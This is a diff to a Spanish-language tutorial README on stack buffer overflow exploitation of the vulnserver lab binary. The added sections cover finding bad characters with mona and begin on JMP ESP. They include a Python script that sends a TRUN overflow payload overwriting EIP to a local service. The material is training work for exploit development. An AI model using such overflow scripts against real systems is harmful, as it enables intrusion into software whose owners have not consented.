@@ -31,6 +31,8 @@ Este repositorio sirve como explicación y aplicación de metodología y anális
   * [7.1.1 Fuzzing con Immunity Debugger](#step7-1-1)
 * [7.2. Descubriendo el offset del registro EIP](#step7-2)
 * [7.3. Controlando el registro EIP](#step7-3)
+* [7.4. Buscando Bad Characters](#step7-4)
+* [7.5. JMP ESP](#step7-5)
 	
 ---
 ---
@@ -210,7 +212,7 @@ La vista que se obtiene consiste en cuatro ventanas:
 
 Código ensamblador - Registros
 
-Stack - Dump de memoria
+Dump de memoria - Stack
 
 ---
 
@@ -665,15 +667,172 @@ Tras la ejecución del script, en la ventana de registros de Immunity se observa
 
 <img width="158" height="205" alt="image" src="https://github.com/user-attachments/assets/7c1bf4f8-8ab2-4948-9b21-2bd71d0bb7fe" />
 
-En el registro ESP (el tope de la pila) si hacemos clic derecho y seleccionamos '_Follow in stack_' y en la ventana del stack hacemos clic derecho y seleccionamos 'HEX' -> 'HEX/ASCII (8 bytes)' se puede observar que lo que se tiene en la pila son todas las 'A's enviadas y finalmente las 4 'B's.
+En el registro ESP (el tope de la pila) si hacemos clic derecho y seleccionamos '_Follow in stack_' se puede observar que lo que se tiene en la pila son todas las 'A's enviadas y finalmente las 4 'B's.
+
+<img width="208" height="162" alt="image" src="https://github.com/user-attachments/assets/29ce03bd-b9cc-4cf7-97d3-cfaf330e4f24" />
+
+
+Si en la ventana del dump hacemos clic derecho y seleccionamos 'HEX' -> 'HEX/ASCII (8 bytes)' también se observa el dump de memoria
 
 <img width="348" height="198" alt="image" src="https://github.com/user-attachments/assets/f2c9a5f8-bd08-4ac9-a017-641449d5bc55" />
 
-Esto demuestra que tenemos control sobre EIP.
+Esto demuestra que tenemos control sobre EIP, por lo tanto, podemos controlar el salto a la siguiente instrucción a ejecutar.
 
+---
 
+<a name="step7-4"></a>
 
+### 👀 ***7.4. Buscando Bad Characters***
 
+A continuación tras haber verificado el offset a EIP hay que enviar todos los posibles bytes para identificar qué caracteres son "malos" (los que se corrompen/filtran al llegar a la memoria). Antes de esto es necesario comprender lo siguiente.
+
+---
+
+Siguiendo el paso anterior, la sobrescritura puede seguir realizandose y enviar más carácteres tras las 4 'B's que se almacenan en el registro EIP. Ej: [ "A" * 2006 + "BBBB" + "C" * 50 ].
+
+Si ahora enviamos este nuevo payload se puede observar que en el tope de la pila (el registro ESP), se encuentran las 'C's añadidas.
+
+<img width="222" height="321" alt="image" src="https://github.com/user-attachments/assets/41ec7771-75e8-40b8-8d2e-faddd88d19f5" />
+
+Por lo tanto, tras controlar el EIP, se puede añadir más información en el registro ESP.
+
+Si ahora en EIP ponemos una dirección de memoria el programa ejecutará todas las instrucciones que haya en esa dirección.
+
+Si somos capaces de encontrar una dirección de memoria que contenga una instrucción para saltar al registro ESP (jmp esp), entonces al ejecutarse y saltar al ESP se ejecutará lo que se haya escrito en ESP.
+
+El comando **!mona modules** muestra las DLLs que está importando el binario. Nos vale para comprobar si tienen habilitados mecanismos de protección como ASLR, SafeSEH, CFG o data execution prevention y de esta manera ver si la explotación puede ser viable.
+
+<img width="1665" height="340" alt="image" src="https://github.com/user-attachments/assets/b4318c06-f5d6-464b-9ae7-186e59903647" />
+
+Por ejemplo en el caso de la DLL _essfunc.dll_ esta no tiene ASLR habilitado por lo tanto la explotación puede ser viable. Si lo estuviera, en cada ejecución sus instrucciones se cargarían en una dirección de memoria diferente imposibilitando ejecutar la instrucción deseada y el exploit no sería reproducible.
+
+---
+
+Retomando los bad chars, antes de generar la explotación final es importante identificar y excluir cualquier carácter incorrecto que pueda corromper el payload a enviar y para la ejecución.
+
+**- Bad chars comunes:** **\x00** (caracter nulo), **\x0A** (Nueva Línea), **\x0D** (Retorno de carro), **\xFF** (Form Feed).
+
+Los bad chars son bytes que no pueden aparecer en nuestro payload porque el programa, la librería o el canal por el que viaja el dato los filtra, transforma o los interpreta (ej. terminan la cadena, se eliminan, se convierten). Si un byte es “malo”, cuando inspecciones la memoria ese valor habrá desaparecido o cambiado —y eso rompe el shellcode o la ejecución.
+
+Para encontrarlos se puede usar una secuencia de todos los caracteres posibles (de \x00 a \xFF) y analizar la memoria para ver si alguno se ha eliminado o modificado.
+Excluir caracteres incorrectos garantiza que la shellcode no tenga bad chards y se ejecute correctamente sin daños.
+
+Además, lo que se envíe al EIP como dirección a sobrescribir tampoco puede llevar bad chars.
+
+Para hacer la prueba y entender lo que ocurre con los bad chars se pone un ejemplo con el caracter nulo '\x00'.
+
+<img width="495" height="27" alt="image" src="https://github.com/user-attachments/assets/e8ff7586-5ec7-4f63-938b-334baf0d8043" />
+
+Se envía como payload una secuencia que contiene el caracter nulo \x00 . Si nos fijamos en el dump de memoria tras el overflow se observa lo siguiente:
+
+<img width="359" height="110" alt="image" src="https://github.com/user-attachments/assets/c68127fb-3386-4f3e-8a07-b2a189353252" />
+
+En este caso, tras la primera secuencia de 'C's que se han enviado se encuentra un '00'. Es decir, el programa ha detectado el caracter nulo y ha detenido la ejecución por lo tanto las siguientes 46 'C's ya no aparecen porque que no se han escrito.
+
+Para automatizar todo esto y buscar bad chars en el binario se puede hacer uso del siguiente script en Python.
+
+<details>
+<summary><b>Python Script Find Bad Chars</b></summary>
+
+```python
+
+import socket
+
+# Define the target server IP and Port
+target_ip = '127.0.0.1'
+target_port = 9999
+
+# Bad characters to send after EIP control
+bad_chars = (
+	b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F"
+	b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F"
+	b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F"
+	b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F"
+	b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F"
+	b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F"
+	b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F"
+	b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F"
+	b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F"
+	b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F"
+	b"\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF"
+	b"\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF"
+	b"\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF"
+	b"\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF"
+	b"\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF"
+	b"\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF"
+)
+
+# Offset is 2006. We are sending 2006 'A's followed by 'BBBB' to check EIP, and then the bad characters
+buffer = b'A' * 2006 + b'BBBB' + bad_chars
+
+# Command
+command = b'TRUN'
+command_magic = b' .'
+
+try:
+	# Create a socket object and connect to the server
+	print('Exploit> Connect to target')
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target_ip, target_port))
+
+	# Receive the banner or welcome message from the server
+	banner = s.recv(1024).decode('utf-8')
+	print(f'Server> {banner}')
+
+	# Bad characters
+	print('Exploit> Sending bad characters')
+	find_bad_chars = command + command_magic + buffer
+	s.send(find_bad_chars)
+
+	# Receive the response
+	print('Exploit> The target server is expected to crash. No response will be received.')
+	try:
+		response = s.recv(1024).decode('utf-8')
+		print(f'Server> {response}')
+	except Exception as e:
+		print(f'Exploit> No response received. The server likely crashed due to the buffer overflow.')
+
+except Exception as e:
+	# Exception handling
+	print(f'An error occurred: {str(e)}')
+
+finally:
+	# Close the connection
+	s.close()
+
+```
+
+</details>
+
+El comando **!mona bytearray** genera un array de caracteres como el que se utiliza en el script anterior y genera un .txt y un .bin .
+
+<img width="1060" height="278" alt="image" src="https://github.com/user-attachments/assets/ba599e52-6f8e-42fa-a2a0-4e5da8ff68f3" />
+
+Al volver a ejecutar el binario vulnserver en Immunity una vez generados el array de caracteres se puede con Mona comparar el bin generado con lo que habíamos puesto en ESP.
+
+```
+
+!mona compare -f C:\Users\Jorge\Desktop\STACK-BUFFER-OVERFLOW-EXPLOITATION\mona\WorkingFolder\vulnserver\bytearray.bin -a 0114F9CC
+
+```
+
+De esta manera:
+
+- Se detectan qué bytes del bytearray han sido transformados/eliminados por el programa vulnserver (los bad chars).
+
+- Mona muestra las diferencias, indica el/los offset(s) donde los bytes no coinciden y genera un informe en la carpeta de trabajo de Mona.
+
+<img width="1146" height="884" alt="image" src="https://github.com/user-attachments/assets/a0f58556-856c-4911-bd7c-71012839b225" />
+
+En este caso aparecen muchos porque sólo hemos enviado el \x00. Si por ejemplo aparece que un bad caracter es \x08, probar a hacer de nuevo !mona bytearray -b "\x08" y volver a realizar la comparación.
+
+---
+
+<a name="step7-5"></a>
+
+### 🦘 ***7.5. JMP ESP***
+
+Una vez sabemos qué bad chars no podemos incluir volvemos al tema del salto a direcciónes para la ejecución de instrucciones. 
 
 
 
